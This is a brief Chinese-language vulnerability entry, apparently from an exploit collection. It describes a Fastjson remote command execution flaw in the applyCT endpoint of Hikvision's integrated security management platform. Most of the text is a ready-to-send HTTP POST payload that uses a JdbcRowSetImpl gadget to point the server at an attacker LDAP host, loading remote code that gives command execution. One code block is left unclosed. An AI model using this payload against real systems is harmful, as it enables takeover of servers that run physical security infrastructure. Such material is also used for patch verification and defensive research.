# Hikvision 综合安防管理平台 applyCT Fastjson远程命令执行漏洞

## 漏洞描述
Hikvision 综合安防管理平台 applyCT 存在低版本Fastjson远程命令执行漏洞，攻击者通过漏洞可以执行任意命令获取服务器权限

## 危害等级
CRITICAL

## 参考链接

## 漏洞复现方法
登录页面

![image-20220824134144287](images/202208241341481.png)

验证POC

```
POST /bic/ssoService/v1/applyCT 
Content-Type: application/json


## Payloads
```
POST /bic/ssoService/v1/applyCT 
Content-Type: application/json

{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://xxx.xxx.xxx.xxx/Basic/TomcatEcho","autoCommit":true},"hfe4zyyzldp":"="}
```
